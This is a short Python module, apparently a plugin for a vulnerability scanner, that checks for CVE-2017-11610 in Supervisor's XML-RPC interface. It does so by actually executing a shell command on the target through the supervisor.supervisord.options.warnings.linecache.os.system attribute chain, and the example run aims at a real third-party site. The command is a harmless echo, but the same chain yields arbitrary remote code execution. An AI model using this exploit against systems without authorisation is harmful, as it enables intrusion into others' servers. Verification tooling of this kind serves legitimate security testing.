#!/usr/bin/env python3

import json
import xmlrpc.client
from app.lib.utils.common import get_capta

class CVE_2017_11610_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': ' CVE-2017-11610任意代码执行漏洞',
            'description': 'CVE-2017-11610任意代码执行漏洞,受影响版本: Supervisor <3.0.1, 3.1.x~3.1.4, 3.2.x~3.2.4, 3.3.x~3.3.3',
            'date': '2017-07-24',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        self.capta = get_capta()

    def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            with xmlrpc.client.ServerProxy(self.url) as proxy:
                old = getattr(proxy, 'supervisor.readLog')(0,0)
                logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
                getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format('echo ' + self.capta, logfile))
                result = getattr(proxy, 'supervisor.readLog')(0,0)
                if self.capta in result[len(old):]:
                    return True
                else:
                    print("不存在CVE-2017-11610任意代码执行漏洞")
                    return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if __name__ == "__main__":
    CVE_2017_11610 = CVE_2017_11610_BaseVerify("http://baidu.com")
    CVE_2017_11610.check()
